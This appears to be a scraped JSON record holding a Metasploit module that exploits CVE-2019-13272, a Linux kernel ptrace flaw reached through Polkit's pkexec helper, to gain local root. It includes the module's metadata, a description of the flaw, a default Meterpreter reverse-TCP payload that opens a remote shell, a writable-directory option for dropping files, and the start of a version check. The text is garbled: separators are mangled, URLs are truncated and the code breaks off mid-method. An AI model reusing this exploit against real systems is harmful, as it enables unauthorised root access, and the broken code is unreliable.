{
    "text": "vul_name : Linux Polkit pkexec Helper PTRACE_TRACEME Local Root ， vul_cve : CVE-2019-13272 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Post : File ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : Kernel ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Compile ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Linux Polkit pkexec helper PTRACE_TRACEME local root exploit' ,  ， 'Description' => %q{ ， This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux ， kernel 5.1.17. This issue can be exploited from a Linux desktop terminal , but ， not over an SSH session , as it requires execution from within the context of ， a user with an active Polkit agent. ， In the Linux kernel before 5.1.17 , ptrace_link in kernel/ptrace.c mishandles ， the recording of the credentials of a process that wants to create a ptrace ， relationship , which allows local users to obtain root access by leveraging ， certain scenarios with a parent-child process relationship , where a parent drops ， privileges and calls execve ( potentially allowing control by an attacker ) . One ， contributing factor is an object lifetime issue ( which can also cause a panic ) . ， Another contributing factor is incorrect marking of a ptrace relationship as ， privileged , which is exploitable through ( for example ) Polkit's pkexec helper ， with PTRACE_TRACEME. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Jann Horn' ,  # Discovery and exploit ， 'bcoles' ,  # Metasploit module ， 'timwr' ,  # Metasploit module ，  ]  ,  ， ' ，  [ 'CVE' , '2019-13272' ]  ,  ，  [ 'EDB' , '47133' ]  ,  ，  [ 'PACKETSTORM' , '153663' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X64 ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'DefaultOptions' => ， { ， 'Payload' => 'linux/x64/meterpreter/reverse_tcp' ,  ， 'PrependFork' => true ,  ， } ,  ， 'DisclosureDate' => 'Jul 4 2019' )  ， register_advanced_options [  ， OptBool.new ( 'ForceExploit' ,  [ false , 'Override check result' , false ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def check ，  # Introduced in 4.10 , but also backported ，  # Patched in 4.4.185 , 4.9.185 , 4.14.133 , 4.19.58 , 5.1.17 ， release = kernel_release ， v = Gem : Version.new release.split ( '-' ) .first ， vprint_error \"Kernel version # {release} is not vulnerable\"",
    "time": "2019.10.24"
}